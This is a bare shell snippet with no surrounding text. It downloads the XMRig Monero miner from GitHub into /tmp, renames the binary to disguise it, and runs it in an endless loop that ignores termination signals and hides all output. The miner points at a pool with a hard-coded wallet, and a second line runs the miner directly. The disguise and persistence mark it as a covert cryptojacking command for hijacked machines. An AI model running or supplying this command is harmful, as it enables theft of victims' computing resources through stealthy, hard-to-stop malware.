nohup bash -c 'trap "" HUP INT QUIT TERM; while true; do cd /tmp && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz && tar -xvzf xmrig-6.22.2-linux-static-x64.tar.gz && cd xmrig-6.22.2 && mv xmrig rdxr && ./rdxr -o eu.hashvault.pro:443 -u SaLvdTxizfddRPvL3jmgiJAhaDHCaHsTx4yrg2mNpqGqA5s3DnWSpiBE4g9ZQMgAVZQRg8AvnjeZZXoKrRwb6M164YcqEcDy8gS -p 48t --tls; done'  > /dev/null 2>&1  &



./xmrig -o eu.hashvault.pro:443 -u SaLvdTxizfddRPvL3jmgiJAhaDHCaHsTx4yrg2mNpqGqA5s3DnWSpiBE4g9ZQMgAVZQRg8AvnjeZZXoKrRwb6M164YcqEcDy8gS -p redhat
